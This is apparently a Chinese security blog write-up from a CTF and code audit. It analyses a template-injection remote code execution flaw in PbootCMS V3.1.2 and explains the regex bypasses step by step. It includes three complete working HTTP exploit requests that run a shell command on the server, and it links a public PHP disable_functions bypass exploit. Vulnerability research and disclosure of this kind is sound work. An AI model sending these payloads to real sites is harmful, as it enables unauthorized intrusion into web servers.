```json
{
  "date": "2021.11.22 11:49",
  "tags": ["php","pbootcms","rce","代码审计"],
  "description":"pboot cms “虚假的无文件落地RCE"
}
```

# pboot cms V3.1.2 "虚假的无文件落地RCE"

  Auth: EDI安全/suanve

### 0 前言

上次电脑送修我就买了个mini  一直用macmini 结果 本子修好以后拿回来也忘了看

苹果售后把我系统分区重装了 导致没有php环境 brew在macos 12上也不能正常工作 

这就直接导致西湖比赛的时候我vardump调试也没调出个所以然（还被大佬喷 （确实 挺简单的一个漏洞

今天回XX以后 调试了一下

![image-20211121212638508](https://github.com/suanve/files/blob/main/image-20211121212638508.png?raw=true)



### 1 分析



根据历史漏洞可以知道在前台 有一个 ssti

搜索`eval`可以找到`eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');`

eval出自`parserIfLabel`函数

找`parserIfLabel`调用可以找到`parserAfter`

找`parserAfter`调用可以找到`SearchController-index`

在`parserAfter`函数中 可以看到获取了`keyword`关键字

![image-20211121215312588](https://github.com/suanve/files/blob/main/image-20211121215312588.png?raw=true)

（有的初学者可能就觉得问题出现在这里了 我比赛的时候也是犯了这个错误 实际上这里的逻辑写的挺好的  取参的时候 会通过正则来校验输入  如果不符合就把传入的数据置空  恶意操作基本进不去

（但是。。。开发者在加载模板的时候 其实已经把我们的payload放入`$content`了所以get里的限制就限制了个寂寞

开始分析 

先把payload带进去 在刚加载（渲染）完模板的时候  可以看到已经把恶意语句加载进来了

![image-20211122021300121](https://github.com/suanve/files/blob/main/image-20211122021300121.png?raw=true)

![image-20211122021252573](https://github.com/suanve/files/blob/main/image-20211122021252573.png?raw=true)

所以他的`get`函数中几个限制完全没起到作用（其实漏洞点不在keyword关键字 后面会详细说

![image-20211122021411827](https://github.com/suanve/files/blob/main/image-20211122021411827.png?raw=true)

![image-20211122021447583](https://github.com/suanve/files/blob/main/image-20211122021447583.png?raw=true)

可以看到 `get`方法内到各种限制操作 确实把不符合规则的keyword给置null了 但是其实content里的还在

![image-20211122021633025](https://github.com/suanve/files/blob/main/image-20211122021633025.png?raw=true)



所以这里跟进看一下最初始的渲染模板部分 首先在这里是加载模板 渲染基础部分生成缓存

![image-20211122022234500](https://github.com/suanve/files/blob/main/image-20211122022234500.png?raw=true)

然后包含缓存后 在这里发现了 echo URL; 这里保存的还是完整url

![image-20211122022335666](https://github.com/suanve/files/blob/main/image-20211122022335666.png?raw=true)

问题就是出在这里了  继续往下看 可以看到`$content = ob_get_contents();` 行吧 直接把url输出然后保存到`$content`里了。

![image-20211122022523389](https://github.com/suanve/files/blob/main/image-20211122022523389.png?raw=true)

即使下面他多次获取keyword时试图不把违规字符带入模板

![image-20211122022956063](https://github.com/suanve/files/blob/main/image-20211122022956063.png?raw=true)

![image-20211122023037670](https://github.com/suanve/files/blob/main/image-20211122023037670.png?raw=true)

都没有一点意义

细心的小伙伴可能发现了 这个问题好像是出在二维码生成标签这个位置的 而在进入我们关键点之前 就有这么一次操作

![image-20211122023726575](https://github.com/suanve/files/blob/main/image-20211122023726575.png?raw=true)

跟进去看一眼 

![image-20211122023846926](https://github.com/suanve/files/blob/main/image-20211122023846926.png?raw=true)

嗯 他匹配了我们二维码这个标签的内容 然后将其生成二维码链接 （所以大家知道了吧 漏洞实际上出在他对模板的渲染部分上 这就导致所有和模板渲染的地方 都会存在这个问题（其实就是只要有二维码分享的页面 都可以触发我们后面的payload

![image-20211122023952696](https://github.com/suanve/files/blob/main/image-20211122023952696.png?raw=true)

所以我们想利用这里的话 只需要针对上面的正则`/\{pboot:qrcode(\s+[^}]+)?\}/`做文章就好了

我们提取出关键的这一行html 发现会被完整的匹配到

![image-20211122024138409](https://github.com/suanve/files/blob/main/image-20211122024138409.png?raw=true)

结合正则很容易理解 括号成对嘛 所以我们给他加一个`}`他不就匹配不到我们的payload了

![image-20211122024236203](https://github.com/suanve/files/blob/main/image-20211122024236203.png?raw=true)

至此 我们已经完整的解决了`{}`带入模板的问题 

接下来就直接把经过各种操作的`$content`带到了`parserIfLabel` 函数 也就是存在eval的地方

![image-20211121215331403](https://github.com/suanve/files/blob/main/image-20211121215331403.png?raw=true)

百度找找历史文章分析就知道无非就是绕那几个正则 

(推荐一个网站  https://regex101.com/ 挺好用的

牵扯到之该cms之前的几个漏洞 我们可以知道完成以下两点即可实现rce

1. 绕过函数执行正则

   ![image-20211121215418614](https://github.com/suanve/files/blob/main/image-20211121215418614.png?raw=true)

2. 绕过参数正则

   ![image-20211121215500061](https://github.com/suanve/files/blob/main/image-20211121215500061.png?raw=true)

一个个来

#### 绕过函数执行正则

说几个知识点 大家都懂得

```php
func(1);
func (1);
func/**/(1);
func
  (1);
```

pbootcms的函数执行检测正则长这样

`([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(`

大概了解一下以后 嗯。。。还想啥 直接fuzz就好啦

![image-20211121213523996](https://github.com/suanve/files/blob/main/image-20211121213523996.png?raw=true)

？？ 咋四种都不行

但是大家别忘了啊 第三种有注释啊/**/

![image-20211121213614962](https://github.com/suanve/files/blob/main/image-20211121213614962.png?raw=true)

你只匹配`([\w+])`那我加一个`-`你还能匹配到吗？你匹配不到了吧。

#### 绕过参数获取的正则

这里我没有详细的去研究怎么绕关键字意义不大 毕竟是ctfer 用点 ctf技巧就派上用场了（网上的漏洞分析有两个关键函数 可以直接用

`get_lg`和`get_backurl`

他俩都在function.php

![image-20211121213754730](https://github.com/suanve/files/blob/main/image-20211121213754730.png?raw=true)

get_lg 是从 cookie lg字段取

```php
// 获取当前语言并进行安全处理Å
function get_lg()
{
    $lg = cookie('lg');
    if (! $lg || ! preg_match('/^[\w\-]+$/', $lg)) {
        $lg = get_default_lg();
        cookie('lg', $lg);
    }
    return $lg;
}
```

get_backurl从get取

```php
// 获取返回URL
function get_backurl()
{
    if (! ! $backurl = get('backurl')) {
        if (isset($_SERVER["QUERY_STRING"]) && ! ! get('p')) {
            return "&backurl=" . $backurl;
        } else {
            return "?backurl=" . $backurl;
        }
    } else {
        return;
    }
}
```



所以使用这两个函数 搭配函数执行方式 就能绕过正则

### 2 利用:

```http
GET /index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id HTTP/1.1
Host: localhost:80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Content-Length: 2



```

![image-20211122024659767](https://github.com/suanve/files/blob/main/image-20211122024659767.png?raw=true)

#### 任意页面皆可rce

根据刚刚所说的 他实际上不是search控制器的问题所以任意页面都可以调用

```http
GET /index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id HTTP/1.1
Host: localhost:80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Content-Length: 2



```

![image-20211122030306637](https://github.com/suanve/files/blob/main/image-20211122030306637.png?raw=true)



```http
GET /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;id HTTP/1.1
Host: localhost:80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Content-Length: 2



```



![image-20211122030414697](https://github.com/suanve/files/blob/main/image-20211122030414697.png?raw=true)



漏洞的挖掘大多数都是站在前人的肩膀上 我也不例外

这样一个调一调就出来了的洞 大家应该都有 公开也没什么不好 



### x 有关西湖论剑ctf

有disablefunction和openbasedir 

php7.2开始弃用了create_function但是没移除 还是可以用的 所以调用

https://github.com/mm0r1/exploits/tree/master/php-filter-bypass

"pwn"一下就好了

![image-20211122020053474](https://github.com/suanve/files/blob/main/image-20211122020053474.png?raw=true)



## 欢迎关注"EDI安全"



![61637560482_.pic](https://github.com/suanve/files/blob/main/61637560482_.pic.jpg?raw=true)